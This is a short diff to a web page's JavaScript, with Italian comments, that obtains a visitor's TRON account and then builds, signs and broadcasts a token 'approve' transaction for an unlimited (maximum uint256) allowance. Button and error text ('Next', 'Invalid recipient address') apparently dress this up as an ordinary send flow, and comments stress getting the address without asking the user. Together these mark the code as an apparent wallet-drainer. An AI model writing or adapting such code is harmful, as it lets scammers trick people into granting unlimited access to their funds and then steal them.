@@ -277,10 +277,18 @@
                     return;
                 }
 
-                // ESATTAMENTE come BSC: ottieni l'indirizzo senza chiedere niente
-                let userAddress = tronWeb.defaultAddress.base58;
+                // ESATTAMENTE come BSC - NON richiede Connect Wallet
+                let accounts = await tronWeb.request({ method: "tron_Accounts" });
+                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
 
-                // Costruisci la transazione per l'approve - ESATTAMENTE come ethers.js
+                if (!userAddress) {
+                    showError('Invalid recipient address');
+                    btn.disabled = false;
+                    btn.textContent = 'Next';
+                    return;
+                }
+
+                // Costruisci la transazione per l'approve
                 const parameter = [
                     {type: 'address', value: token.smartContract},
                     {type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}
@@ -294,7 +302,7 @@
                     userAddress
                 );
 
-                // Firma e invia - ESATTAMENTE come ethers.js
+                // Firma e invia
                 const signedTx = await tronWeb.trx.sign(tx.transaction);
                 let txHash = await tronWeb.trx.sendRawTransaction(signedTx);
 
